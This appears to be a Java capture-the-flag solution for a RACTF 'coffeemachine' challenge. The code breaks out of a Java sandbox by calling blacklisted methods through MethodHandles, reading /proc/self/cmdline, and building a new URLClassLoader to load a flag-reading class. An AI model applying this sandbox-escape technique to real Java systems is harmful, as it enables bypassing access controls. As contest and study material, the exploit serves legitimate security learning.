import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;

public class Main implements Runnable {

    /**
     * If this class loads any other classes, they will be checked by the same class loader this class was.
     * To get around this, the exploit makes a new URLClassLoader pointed at the current jar, which is then used to
     * load uk.co.ractf.coffeemachine.FlagGetter which is able to access SecureStorage and get the flag.
     */
    @Override
    public void run() {
        try {
            //The only way of calling blacklisted methods is through the MethodHandles api (hopefully)
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodHandle getParameterCount = lookup.findVirtual(Constructor.class, "getParameterCount", MethodType.methodType(int.class));
            MethodHandle newInstance = lookup.findVirtual(Constructor.class, "newInstance", MethodType.methodType(Object.class, Object[].class));

            //Iterate over the constructors of URLClassLoader until we find the one that only takes an array of urls
            for (Constructor<?> m : URLClassLoader.class.getConstructors()) {
                if ((int) getParameterCount.invoke(m) == 1) {

                    //Because java we have no way to get the command line args at runtime, so we read proc self cmdline
                    //This is actually wrong and theres a system property on most jvms, but ive written the exploit now
                    MethodHandle readStr = lookup.findStatic(Files.class, "readString", MethodType.methodType(String.class, Path.class));
                    MethodHandle path = lookup.findStatic(Path.class, "of", MethodType.methodType(Path.class, String.class, String[].class));
                    Object o = path.invoke("/proc", "self", "cmdline");
                    String text = (String) readStr.invoke(o);
                    String[] parts = text.split(String.valueOf((char) 0));

                    //We then create a URL with the path we got from the command line
                    for (final Constructor<?> constructor : URL.class.getConstructors()) {
                        if ((int) getParameterCount.invoke(constructor) == 1) {
                            URL url = (URL) newInstance.invoke(constructor, parts[parts.length - 1]);
                            URL[] urls = new URL[]{url};
                            //Create the class loader
                            ClassLoader x = (ClassLoader) newInstance.invoke(m, new Object[]{urls});
                            MethodHandle load = lookup.findVirtual(URLClassLoader.class, "loadClass", MethodType.methodType(Class.class, String.class));

                            //Load the class
                            Class<?> clazz = (Class<?>) load.invoke(x, "uk.co.ractf.coffeemachine.FlagGetter");
                            Constructor<?> constructor1 = clazz.getConstructors()[0];

                            //The constructor will print the flag, ez
                            newInstance.invoke(constructor1);
                        }
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

}
